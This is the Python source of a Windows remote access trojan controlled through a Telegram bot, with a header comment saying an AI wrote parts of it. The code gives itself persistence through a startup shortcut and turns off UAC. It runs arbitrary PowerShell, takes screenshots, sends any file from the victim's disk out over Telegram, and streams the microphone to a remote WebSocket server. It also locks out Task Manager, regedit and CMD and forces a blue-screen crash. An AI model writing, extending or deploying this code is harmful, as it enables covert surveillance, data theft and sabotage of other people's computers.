#СУКА ЭТО НЕ ИИ, ИИ МНЕ ПИСАЛ КОММЕНТАРИИ И ПЕРЕПИСАЛ НЕКОТОРЫЕ ФУНКЦИИ КОТОРЫЕ РАБОТАЛИ БЕЗ НЕГО, ПОЛНОСТЮ ИИ ТОЛЬКО ФУНКЦИИ WEBSOCKET И GETFILE
import telebot
import os
from telebot import types
import webbrowser
import pyautogui as pg
import psutil
import pyaudio
import getpass
import shutil
import winreg
import keyboard
import subprocess
import platform
import http.client
import GPUtil
import wmi
import threading
import pythoncom
import sys
import win32com.client
from ctypes import *
import ctypes
import time
import websocket
from websocket import create_connection
from audioplayer import AudioPlayer
import configparser

config = configparser.ConfigParser()
config.read('config.ini')
API_KEY = config.get('Telegram', 'api_key')
WEBSOCKET_SERVER_URI = config.get('Websocket', 'server_url')# Адрес WebSocket сервера
bot = telebot.TeleBot(API_KEY)

# --- Переменные для аудиопотока ---
ws_stream_thread = None # Поток для отправки аудио
ws_connection = None # Объект WebSocket соединения
is_streaming = False # Флаг, идет ли стриминг 

@bot.message_handler(commands=['start'])
def start(message):
    # Отправляет список команд.
    bot.send_message(message.chat.id,'Список команд: \n/screenshot - скриншот \n/systeminfo - информация о системе ' \
    '\n /shutdown - выключить пк \n /mouse - управление мышью \n /opensite - открыть сайт ' \
    '\n /open - запуск программ \n /sendmsg - отправить сообщение \n /sendfile - отправить файл \n /tmOff - выключить диспетчер задач ' \
    '\n /tmOn - включить диспетчер задач \n /keyboard - управление клавиатурой \n /powershell - исполнение команд powershell ' \
    '\n /getfile отправить файл с компа \n /disableRegistryTools - отключить редактор реестра ' \
    '\n /enableRegistryTools - включить редактор реестра \n /disableCMD - отключить CMD \n /enableCMD - включить CMD ' \
    '\n /disableControlPanel - отключить панель управления \n /enableControlPanel - включить панель управления ' \
    '\n /NoRun - отключить меню выполнить \n /enableRun - включить меню выполнить \n /NoDrives - отключить отображение дисков ' \
    '\n /enableDrives - включить отображение дисков \n /screamer - скример \n /bsod - вызывает BSOD \n /start_stream - начать аудиопоток ' \
    '\n /stop_stream - остановить аудиопоток \n /ping - пинг бота')
    # Копирование файлов в программы в папку WindowsRA(я ее сам придумал), настройка UAC и автозагрузки
    cwd = os.getcwd()
    if not os.path.exists('C:\\Program Files\\WindowsRA'):
        os.makedirs('C:\\Program Files\\WindowsRA', exist_ok=True)
    shutil.copy(f'{cwd}\\ratbot.exe', f'C:\\Program Files\\WindowsRA')
    shutil.copytree(f'{cwd}\\_internal', f'C:\\Program Files\\WindowsRA', dirs_exist_ok=True)
    autorun(message)
    UAC(message)
    

@bot.message_handler(commands=['screenshot'])
def screenshot(message):
    # Делает и отправляет скриншот.
    try:
        screenshot_path = 'screenshot.png'
        pg.screenshot(screenshot_path)
        with open(screenshot_path, 'rb') as file:
            bot.send_photo(message.chat.id, file)
        os.remove(screenshot_path)
    except Exception as e:
        print(f"Ошибка screenshot: {e}")
        try:
            bot.send_message(message.chat.id, f"Ошибка при создании скриншота: {e}")
        except:
            pass 


@bot.message_handler(commands=['systeminfo'])
def system_info(message):
    # Запускает сбор системной информации в потоке.
    try:
        def worker():
            # Собирает и отправляет информацию о системе.
            pythoncom.CoInitializeEx(0)
            info_parts = []
            try:
                # --- Получение основной информации --- 
                cpu_usage = psutil.cpu_percent(interval=1)
                memory_info = psutil.virtual_memory()
                disk_usage = psutil.disk_usage('/')

                # --- Получение имени CPU (WMI с fallback) ---
                cpu_name = platform.processor()
                try:
                    wmi_conn = wmi.WMI()
                    processors = wmi_conn.Win32_Processor()
                    if processors:
                        cpu_name = processors[0].Name.strip()
                except ImportError:
                     cpu_name = platform.processor() + " (WMI недоступен)"
                except Exception as wmi_e:
                    print(f"Ошибка WMI при получении CPU: {wmi_e}")

                # --- Получение информации о GPU (GPUtil) ---
                gpu_name = "Недоступно"
                gpu_usage = 0
                try:
                    gpus = GPUtil.getGPUs()
                    if gpus:
                        gpu_name = gpus[0].name
                        gpu_usage = round(gpus[0].load * 100, 1)
                    else:
                        gpu_name = "Не обнаружено"
                except Exception as gpu_e:
                    print(f"Ошибка GPUtil: {gpu_e}")
                    gpu_name = "Недоступно (ошибка)"

                # --- Получение IP (http.client) ---
                ip = "Недоступно"
                conn = None
                try:
                    conn = http.client.HTTPConnection("ifconfig.me", timeout=10)
                    conn.request("GET", "/ip")
                    response = conn.getresponse()
                    if response.status == 200:
                       ip_bytes = response.read()
                       try:
                           ip = ip_bytes.decode('utf-8').strip()
                       except UnicodeDecodeError:
                           ip = ip_bytes.decode('ascii', errors='ignore').strip()
                    else:
                        ip = f"Ошибка HTTP: {response.status}"
                except Exception as ip_e:
                    ip = f"Ошибка сети: {ip_e}"
                    print(f"Ошибка сети при получении IP: {ip_e}")
                finally:
                    if conn:
                        conn.close()

                # --- Отправка сообщения --- 
                info_parts.append(f'System: {platform.uname().system}')
                info_parts.append(f'CPU: {cpu_name}')
                info_parts.append(f'GPU: {gpu_name}')
                info_parts.append(f'RAM: {memory_info.total // (1024 * 1024)} MB')
                info_parts.append(f'IP: {ip}')
                info_parts.append(f'Использование CPU: {cpu_usage}%')
                info_parts.append(f'Использование GPU: {gpu_usage}%')
                info_parts.append(f'Использование памяти: {memory_info.percent}%')
                info_parts.append(f'Свободная память: {memory_info.available // (1024 * 1024)} MB')
                info_parts.append(f'Использование диска: {disk_usage.percent}%')
                info_parts.append(f'Свободное место на диске: {disk_usage.free // (1024 * 1024)} MB')
                info_parts.append(f'Объем диска: {disk_usage.total // (1024 * 1024)} MB')
                final_info = '\n'.join(info_parts)
                
                bot.send_message(message.chat.id, 'Информация о системе:\n' + final_info)

            except Exception as e_inner:
                print(f'Ошибка в потоке worker: {e_inner}')
                try:
                    bot.send_message(message.chat.id, f'Ошибка при сборе информации: {str(e_inner)}')
                except Exception as send_err:
                    print(f'Не удалось отправить сообщение об ошибке: {send_err}')
            finally:
                pythoncom.CoUninitialize()

        thread = threading.Thread(target=worker)
        thread.start()

    except Exception as e_outer:
        print(f'Ошибка при запуске потока worker: {e_outer}')
        try:
            bot.send_message(message.chat.id, f'Ошибка при запуске сбора информации: {str(e_outer)}')
        except Exception as send_err:
             print(f'Не удалось отправить сообщение об ошибке запуска потока: {send_err}')


def autorun(message):
    # Копирует файлы бота в AppData\Local и создает ярлык в автозагрузке.
    try:
        pythoncom.CoInitializeEx(0) # Инициализируем COM для этого потока
        
        # 1. Определяем пути
        if not getattr(sys, 'frozen', False):
            bot.send_message(message.chat.id, 'autorun следует использовать только для скомпилированной версии (.exe).')
            return

        # Путь к текущему .exe и его папке
        exe_path = sys.executable
        source_dir = os.path.dirname(exe_path)
        exe_filename = os.path.basename(exe_path)

        # Целевая папка установки в AppData\Local (не требует админа)
        target_base_dir = os.getenv('LOCALAPPDATA')
        if not target_base_dir:
            raise Exception("Не удалось определить путь к LOCALAPPDATA.")
        target_install_dir = os.path.join(target_base_dir, 'WindowsRA')
        target_exe_path = os.path.join(target_install_dir, exe_filename)

        # Папка автозагрузки пользователя
        username = getpass.getuser()
        startup_dir = f'C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/'
        shortcut_path = os.path.join(startup_dir, f"{os.path.splitext(exe_filename)[0]}.lnk")

        bot.send_message(message.chat.id, f'Копирование файлов в {target_install_dir}...')

        # 2. Копируем все файлы из папки с .exe в целевую папку
        shutil.copytree(source_dir, target_install_dir, dirs_exist_ok=True)
        bot.send_message(message.chat.id, 'Файлы скопированы.')

        # 3. Создаем ярлык в автозагрузке
        bot.send_message(message.chat.id, f'Создание ярлыка в {startup_dir}...')
        os.makedirs(startup_dir, exist_ok=True)
        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortCut(shortcut_path)
        shortcut.TargetPath = target_exe_path
        shortcut.WorkingDirectory = target_install_dir
        shortcut.Save()

        bot.send_message(message.chat.id, 'Бот успешно добавлен в автозагрузку.')

    except ImportError:
        print("Ошибка autorun: Необходима библиотека pywin32 (pip install pywin32)")
        bot.send_message(message.chat.id, 'Ошибка: Для создания ярлыка автозагрузки необходима библиотека pywin32.')
    except Exception as e:
        print(f"Ошибка autorun: {e}")
        if isinstance(e, PermissionError) or (hasattr(e, 'winerror') and e.winerror == 5):
             bot.send_message(message.chat.id, f'Ошибка при добавлении в автозагрузку: Отказано в доступе. Попробуйте запустить бота от имени администратора.')
        # Проверяем на ошибку CoInitialize
        elif isinstance(e, pythoncom.com_error) and e.hresult == -2147221008:
             bot.send_message(message.chat.id, 'Ошибка COM: Не удалось инициализировать среду. Попробуйте перезапустить бота.')
        else:
             bot.send_message(message.chat.id, f'Ошибка при добавлении в автозагрузку: {e}')
    finally:
        try:
            pythoncom.CoUninitialize()
        except Exception:
            pass


@bot.message_handler(commands=['shutdown'])
def pcshutdown(message):
    # Выключает ПК.
    os.system("shutdown /s /t 1")
    bot.send_message(message.chat.id, 'Выключение...')


def audio_stream_worker(message):
    """Функция, выполняющаяся в потоке для отправки аудио."""
    global ws_connection, is_streaming
    audio = None
    stream = None
    ws = None

    try:
        # --- Настройки аудио ---
        chunk = 4096
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100
        # Настройки для Ping
        ping_interval = 20  # Отправлять пинг каждые 20 секунд
        last_ping_time = time.time()

        # --- Подключение к WebSocket серверу ---
        try:
            ws = create_connection(
                WEBSOCKET_SERVER_URI, 
                timeout=10,
                # Включаем поддержку пингов (хотя клиент и так должен отвечать)
                enable_multithread=True # На всякий случай для пингов в фоне
            )
            bot.send_message(message.chat.id, f"Подключено к WebSocket серверу: {WEBSOCKET_SERVER_URI}")
            ws_connection = ws
        except Exception as ws_e:
            bot.send_message(message.chat.id, f"Ошибка подключения к WebSocket: {ws_e}")
            is_streaming = False 
            return 

        # --- Инициализация аудио ---
        audio = pyaudio.PyAudio()
        stream = audio.open(format=FORMAT, channels=CHANNELS,
                            rate=RATE, input=True,
                            frames_per_buffer=chunk)
        bot.send_message(message.chat.id, "Аудиопоток открыт, начинаем отправку...")

        # --- Цикл отправки аудио ---
        error_count = 0
        max_errors = 3
        while is_streaming:
            try:
                # Отправка Ping для поддержания соединения
                current_time = time.time()
                if current_time - last_ping_time > ping_interval:
                    if ws.connected:
                        ws.ping()
                        last_ping_time = current_time
                    else:
                         bot.send_message(message.chat.id, "Соединение потеряно перед отправкой пинга.")
                         is_streaming = False
                         break

                # Считываем и отправляем аудио
                data = stream.read(chunk, exception_on_overflow=False)
                
                if ws.connected:
                    ws.send_binary(data)
                    error_count = 0 
                else:
                    bot.send_message(message.chat.id, "WebSocket соединение закрыто перед отправкой данных.")
                    is_streaming = False
                    break
                    
                # Пауза не нужна, stream.read() блокирующий
                
            except websocket.WebSocketConnectionClosedException:
                bot.send_message(message.chat.id, "WebSocket соединение закрыто сервером.")
                is_streaming = False
                break
            except ConnectionError as conn_e:
                error_count += 1
                bot.send_message(message.chat.id, f"Ошибка соединения: {conn_e}")
                if error_count >= max_errors:
                    bot.send_message(message.chat.id, f"Превышено число ошибок ({max_errors}), останавливаем стрим.")
                    is_streaming = False
                    break
                time.sleep(1)
            except Exception as loop_e:
                error_count += 1
                bot.send_message(message.chat.id, f"Ошибка в цикле отправки аудио: {loop_e}")
                if error_count >= max_errors:
                    bot.send_message(message.chat.id, f"Превышено число ошибок ({max_errors}), останавливаем стрим.")
                    is_streaming = False
                    break
                time.sleep(1)

        bot.send_message(message.chat.id, "Цикл отправки аудио завершен.")

    except Exception as e:
        bot.send_message(message.chat.id, f"Ошибка в потоке audio_stream_worker: {e}")
    finally:
        # --- Очистка ресурсов ---
        if ws:
            try:
                ws.close()
                bot.send_message(message.chat.id, "WebSocket соединение закрыто.")
            except: pass
        if stream:
            try:
                stream.stop_stream()
                stream.close()
                bot.send_message(message.chat.id, "Аудиопоток остановлен и закрыт.")
            except: pass
        if audio:
            try:
                audio.terminate()
                bot.send_message(message.chat.id, "PyAudio терминирован.")
            except: pass
        ws_connection = None
        is_streaming = False


@bot.message_handler(commands=['start_stream'])
def start_audio_stream(message):
    """Запускает поток отправки аудио на WebSocket сервер."""
    global ws_stream_thread, is_streaming
    if is_streaming:
        bot.send_message(message.chat.id, "Аудиопоток уже запущен.")
        return
    is_streaming = True
    bot.send_message(message.chat.id, f"Запуск аудиопотока на {WEBSOCKET_SERVER_URI}...")
    # Создаем и запускаем поток
    ws_stream_thread = threading.Thread(target=audio_stream_worker, args=(message,), daemon=True)
    ws_stream_thread.start()
    # Даем немного времени на попытку подключения
    time.sleep(1)
    if not is_streaming: # Если за секунду поток завершился (ошибка подключения)
        bot.send_message(message.chat.id, "Не удалось запустить поток. Проверьте консоль на ошибки и доступность WebSocket сервера.")


@bot.message_handler(commands=['stop_stream'])
def stop_audio_stream(message):
    """Останавливает поток отправки аудио."""
    global is_streaming, ws_stream_thread, ws_connection
    if not is_streaming:
        bot.send_message(message.chat.id, "Аудиопоток не запущен.")
        return
    bot.send_message(message.chat.id, "Остановка аудиопотока...")
    is_streaming = False # Сигнализируем потоку остановиться

    # Ждем немного, чтобы поток успел завершиться сам
    if ws_stream_thread:
         ws_stream_thread.join(timeout=2) # Ждем до 2 секунд

    # Дополнительно закрываем соединение, если оно еще есть
    if ws_connection:
        try:
            ws_connection.close()
        except: pass
        ws_connection = None

    ws_stream_thread = None
    bot.send_message(message.chat.id, "Аудиопоток остановлен.")


@bot.message_handler(commands=['mouse'])
def mouse(message):
    # Показывает кнопки управления мышью.
    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True)
    MenuBtn2 = types.KeyboardButton('клик левой кнопкой')
    MenuBtn3 = types.KeyboardButton('клик правой кнопкой')
    MenuBtn4 = types.KeyboardButton('переместить мышь')
    markup.add(MenuBtn2, MenuBtn3, MenuBtn4)
    bot.send_message(message.chat.id, 'Выберите действие:', reply_markup=markup)
    bot.register_next_step_handler(message, handle_mouse_action)


def handle_mouse_action(message):
    # Обрабатывает нажатие кнопок управления мышью.
    if message.text == 'клик левой кнопкой':
        pg.click(button='left')
        bot.send_message(message.chat.id, 'Клик левой кнопкой выполнен!', reply_markup=types.ReplyKeyboardRemove())
    elif message.text == 'клик правой кнопкой':
        pg.click(button='right')
        bot.send_message(message.chat.id, 'Клик правой кнопкой выполнен!', reply_markup=types.ReplyKeyboardRemove())
    elif message.text == 'переместить мышь':
        bot.send_message(message.chat.id, 'Введите координаты X и Y через пробел:', reply_markup=types.ReplyKeyboardRemove())
        bot.register_next_step_handler(message, move_mouse)
    else:
         bot.send_message(message.chat.id, 'Неизвестное действие.', reply_markup=types.ReplyKeyboardRemove())
    

def move_mouse(message):
    # Перемещает курсор мыши.
    try:
        coords = message.text.split()
        if len(coords) == 2:
            x, y = int(coords[0]), int(coords[1])
            pg.moveTo(x, y)
            bot.send_message(message.chat.id, 'Мышь перемещена!')
        else:
            bot.send_message(message.chat.id, 'Неверный формат координат. Введите X и Y через пробел.')
    except ValueError:
        bot.send_message(message.chat.id, 'Координаты должны быть числами.')
    except Exception as e:
         print(f"Ошибка move_mouse: {e}")
         bot.send_message(message.chat.id, f'Ошибка при перемещении мыши: {e}')


@bot.message_handler(commands=['opensite'])
def openweb(message):
    # Запрашивает URL для открытия.
    bot.send_message(message.chat.id, 'Введите URL сайта:')
    bot.register_next_step_handler(message, web)


def web(message):
    # Открывает URL в браузере.
    url = message.text
    if not url.startswith('http://') and not url.startswith('https://'):
        url = 'http://' + url 
    try:
        webbrowser.open(url, new=1)
        bot.send_message(message.chat.id, 'Открыто!')
    except Exception as e:
        print(f"Ошибка web: {e}")
        bot.send_message(message.chat.id, f'Не удалось открыть сайт: {e}')


@bot.message_handler(commands=['sendmsg'])
def text(message):
    # Запрашивает текст сообщения для отображения.
    bot.send_message(message.chat.id, 'Введите сообщение')
    bot.register_next_step_handler(message, textdef)


def textdef(message):
    # Отображает всплывающее сообщение.
    text = message.text
    pg.alert(text)
    bot.send_message(message.chat.id, 'Отправлено!')


@bot.message_handler(commands=['open'])
def progstart(message):
    # выбор программы для запуска.
    bot.send_message(message.chat.id,'Путь к файлу?')
    bot.register_next_step_handler(message, opendef)


def opendef(message):
    # Запускает программу по указанному пути.
    put = message.text
    os.startfile(put)
    bot.send_message(message.chat.id, 'Открыто!')


@bot.message_handler(commands=['keyboard'])
def keyboardcontrol(message):
    # Запрашивает текст для имитации ввода.
    bot.send_message(message.chat.id, 'введите сообщение , которое будет написано на клавиатуре')
    bot.register_next_step_handler(message, keyboardwrite)


def keyboardwrite(message):
    # Имитирует ввод текста с клавиатуры.
    keyboard.write(message.text)
    bot.send_message(message.chat.id, 'нажато!')


@bot.message_handler(commands=['sendfile'])
def ask_for_file(message):
    # Запрашивает у пользователя файл для загрузки на ПК.
    bot.send_message(message.chat.id, 'Отправьте файл, в имени файла не должно быть спец. символов')
    bot.register_next_step_handler(message, handle_file)


@bot.message_handler(content_types=['document', 'photo', 'audio', 'video'])
def handle_file(message):
    # Сохраняет полученный от пользователя файл и пытается его открыть.
    try:
        if message.document:
            file_info = bot.get_file(message.document.file_id)
            file_name = message.document.file_name
            dest_folder = os.path.join('files', 'documents')
        elif message.photo:
            file_info = bot.get_file(message.photo[-1].file_id)
            file_name = os.path.basename(file_info.file_path)
            dest_folder = os.path.join('files', 'photos')
        elif message.video:
            file_info = bot.get_file(message.video.file_id)
            file_name = message.video.file_name if hasattr(message.video, 'file_name') and message.video.file_name else f"{message.video.file_id}.mp4"
            dest_folder = os.path.join('files', 'video')
        elif message.audio:
            file_info = bot.get_file(message.audio.file_id)
            file_name = message.audio.file_name if message.audio.file_name else f"{message.audio.title or 'audio'}.mp3"
            dest_folder = os.path.join('files', 'audio')
        else:
            bot.reply_to(message, "Неподдерживаемый тип файла")
            return

        if not os.path.exists(dest_folder):
            os.makedirs(dest_folder)
        
        downloaded_file = bot.download_file(file_info.file_path)
        src = os.path.join(dest_folder, file_name)
        with open(src, 'wb') as new_file:
            new_file.write(downloaded_file)
        bot.send_message(message.chat.id, 'Файл загружен и сохранен!(наверное)')
        os.system(f'start {src}')
    except Exception as e:
        bot.reply_to(message, f"Ошибка: {e}")


@bot.message_handler(commands=['tmOff'])
def tmOff(message):
    # Отключает Диспетчер задач через реестр.
    try:
        tmreg = winreg.OpenKeyEx(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies")
        tmkey = winreg.CreateKey(tmreg, "System")
        winreg.SetValueEx(tmkey, 'DisableTaskMgr', 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(tmkey)
        bot.send_message(message.chat.id, 'диспетчер задач отключен')
    except Exception as e:
        bot.send_message(message.chat.id, f'Ошибка:{e}')


@bot.message_handler(commands=['tmOn'])
def tmOn(message):
    # Включает Диспетчер задач через реестр.
    try:
        tmreg = winreg.OpenKeyEx(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies")
        tmkey = winreg.CreateKey(tmreg, "System")
        winreg.SetValueEx(tmkey, 'DisableTaskMgr', 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(tmkey)
        bot.send_message(message.chat.id, 'диспетчер задач включен')
    except Exception as e:
        bot.send_message(message.chat.id, f'Ошибка{e}')


def UAC(message):
    # Выключает UAC через реестр.
    try:
        tmreg = winreg.OpenKeyEx(winreg.HKEY_LOCAL_MACHINE, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies")
        tmkey = winreg.CreateKey(tmreg, "System")
        winreg.SetValueEx(tmkey, 'EnableLUA', 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(tmkey)
        bot.send_message(message.chat.id, 'UAC выключен, перезагрузка компьютера')
        os.system("shutdown /r /t 0")
    except Exception as e:
        bot.send_message(message.chat.id, f'Ошибка{e}')


@bot.message_handler(commands=['disableRegistryTools'])
def disableRegistryTools(message):
    # Отключает регистрационные инструменты через реестр.
    try:
        tmreg = winreg.OpenKeyEx(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies")
        tmkey = winreg.CreateKey(tmreg, "System")
        winreg.SetValueEx(tmkey, 'DisableRegistryTools', 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(tmkey)
        bot.send_message(message.chat.id, 'реестр отключен')
    except Exception as e:
        bot.send_message(message.chat.id, f'Ошибка{e}')


@bot.message_handler(commands=['enableRegistryTools'])
def enableRegistryTools(message):
    # Включает регистрационные инструменты через реестр.
    try:
        tmreg = winreg.OpenKeyEx(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies")
        tmkey = winreg.CreateKey(tmreg, "System")
        winreg.SetValueEx(tmkey, 'DisableRegistryTools', 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(tmkey)
        bot.send_message(message.chat.id, 'реестр включен')
    except Exception as e:
        bot.send_message(message.chat.id, f'Ошибка{e}')


@bot.message_handler(commands=['disableCMD'])
def disableCMD(message):
    # Отключает CMD через реестр.
    try:
        tmreg = winreg.OpenKeyEx(winreg.HKEY_CURRENT_USER, r"Software\\Policies\\Microsoft\\Windows")
        tmkey = winreg.CreateKey(tmreg, "System")
        winreg.SetValueEx(tmkey, 'DisableCMD', 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(tmkey)
        bot.send_message(message.chat.id, 'CMD отключен')
    except Exception as e:
        bot.send_message(message.chat.id, f'Ошибка{e}')


@bot.message_handler(commands=['enableCMD'])
def enableCMD(message):
    # Включает CMD через реестр.
    try:
        tmreg = winreg.OpenKeyEx(winreg.HKEY_CURRENT_USER, r"Software\\Policies\\Microsoft\\Windows")
        tmkey = winreg.CreateKey(tmreg, "System")
        winreg.SetValueEx(tmkey, 'DisableCMD', 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(tmkey)
        bot.send_message(message.chat.id, 'CMD включен')
    except Exception as e:
        bot.send_message(message.chat.id, f'Ошибка{e}')


@bot.message_handler(commands=['disableControlPanel'])
def disableControlPanel(message):
    # Отключает панель управления через реестр.
    try:
        tmreg = winreg.OpenKeyEx(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies")
        tmkey = winreg.CreateKey(tmreg, "explorer")
        winreg.SetValueEx(tmkey, 'NoControlPanel', 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(tmkey)
        bot.send_message(message.chat.id, 'панель управления отключена')
    except Exception as e:
        bot.send_message(message.chat.id, f'Ошибка{e}')


@bot.message_handler(commands=['enableControlPanel'])
def enableControlPanel(message):
    # Включает панель управления через реестр.
    try:
        tmreg = winreg.OpenKeyEx(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies")
        tmkey = winreg.CreateKey(tmreg, "explorer")
        winreg.SetValueEx(tmkey, 'NoControlPanel', 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(tmkey)
        bot.send_message(message.chat.id, 'панель управления включена')
    except Exception as e:
        bot.send_message(message.chat.id, f'Ошибка{e}')


@bot.message_handler(commands=['NoRun'])
def NoRun(message):
    # Отключает меню выполнить через реестр.
    try:
        tmreg = winreg.OpenKeyEx(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies")
        tmkey = winreg.CreateKey(tmreg, "explorer")
        winreg.SetValueEx(tmkey, 'NoRun', 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(tmkey)
        bot.send_message(message.chat.id, 'меню выполнить отключено')
    except Exception as e:
        bot.send_message(message.chat.id, f'Ошибка{e}')


@bot.message_handler(commands=['enableRun'])
def enableRun(message):
    # Включает меню выполнить через реестр.
    try:
        tmreg = winreg.OpenKeyEx(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies")
        tmkey = winreg.CreateKey(tmreg, "explorer")
        winreg.SetValueEx(tmkey, 'NoRun', 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(tmkey)
        bot.send_message(message.chat.id, 'меню выполнить включено')
    except Exception as e:
        bot.send_message(message.chat.id, f'Ошибка{e}')


@bot.message_handler(commands=['NoDrives'])
def NoDrives(message):
    # Отключает диски через реестр.
    try:
        tmreg = winreg.OpenKeyEx(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies")
        tmkey = winreg.CreateKey(tmreg, "explorer")
        winreg.SetValueEx(tmkey, 'NoDrives', 0, winreg.REG_DWORD, 31)
        winreg.CloseKey(tmkey)
        bot.send_message(message.chat.id, 'диски отключены')
    except Exception as e:
        bot.send_message(message.chat.id, f'Ошибка{e}')


@bot.message_handler(commands=['enableDrives'])
def enableDrives(message):
    # Включает диски через реестр.
    try:    
        tmreg = winreg.OpenKeyEx(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies")
        tmkey = winreg.CreateKey(tmreg, "explorer")
        winreg.SetValueEx(tmkey, 'NoDrives', 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(tmkey)
        bot.send_message(message.chat.id, 'диски включены')
    except Exception as e:
        bot.send_message(message.chat.id, f'Ошибка{e}')


@bot.message_handler(commands=['powershell'])
def powershellstart(message):
    # Запрашивает команду PowerShell.
    bot.send_message(message.chat.id, 'введите powershell команду( в одну строчку через ; )')
    bot.register_next_step_handler(message, powershell)


def powershell(message):
    # Выполняет команду PowerShell.
    try:
        result = subprocess.run(["powershell","-Command", message.text], capture_output=True)
        bot.send_message(message.chat.id, f'комманда выполнена!(наверное) {result.stdout.decode('cp866')}')
    except Exception as e:
        bot.send_message(message.chat.id, f'ошибка: {e}')


@bot.message_handler(commands=['bsod'])
def bsod(message):
    # Вызывает BSOD.
    bot.send_message(message.chat.id, 'BSOD вызван')
    nullptr = POINTER(c_int)()
    windll.ntdll.RtlAdjustPrivilege(
        c_uint(19),
        c_uint(1),
        c_uint(0),
        byref(c_int())
    )
    windll.ntdll.NtRaiseHardError(
        c_ulong(0xC000007B),
        c_ulong(0),
        nullptr,
        nullptr,
        c_uint(6),
        byref(c_uint())
    )


@bot.message_handler(commands=['screamer'])
def screamer(message):
    # Вызывает скример.
    player = AudioPlayer(f'{cwd}\\_internal\\screamer.mp3')
    cwd = os.getcwd()
    ctypes.windll.user32.SystemParametersInfoW(20, 0, f'{cwd}\\_internal\\screamer.png', 0)
    player.play(block=True)
    bot.send_message(message.chat.id, 'Скример страшный очень отвечаю')


@bot.message_handler(commands=['ping'])
def ping(message):
    # Пинг бота.
    bot.send_message(message.chat.id, 'работает')


@bot.message_handler(commands=['getfile'])
def getfile_start(message):
    # Запрашивает путь к файлу для отправки.
    bot.send_message(message.chat.id, 'введите путь до файла(можно найти через cd и ls в powershell)')
    bot.register_next_step_handler(message, getfile)


def getfile(message):
    # Отправляет запрошенный файл пользователю.
    try:
        file_path = message.text.strip()
        if os.path.exists(file_path):
            ext = os.path.splitext(file_path)[1].lower()
            with open(file_path, 'rb') as f:
                if ext in ['.jpg', '.jpeg', '.png', '.gif']:
                    bot.send_photo(message.chat.id, f)
                elif ext in ['.mp3', '.wav', '.ogg']:
                    bot.send_audio(message.chat.id, f)
                elif ext in ['.mp4', '.avi', '.mkv']:
                    bot.send_video(message.chat.id, f)
                elif ext in ['.pdf', '.doc', '.docx', '.txt']:
                    bot.send_document(message.chat.id, f)
                else:
                    bot.send_document(message.chat.id, f)
        else:
            bot.send_message(message.chat.id, "Файл не найден")
    except Exception as e:
        bot.send_message(message.chat.id, f'ошибка: {e}')


bot.infinity_polling(timeout=20, long_polling_timeout = 5)
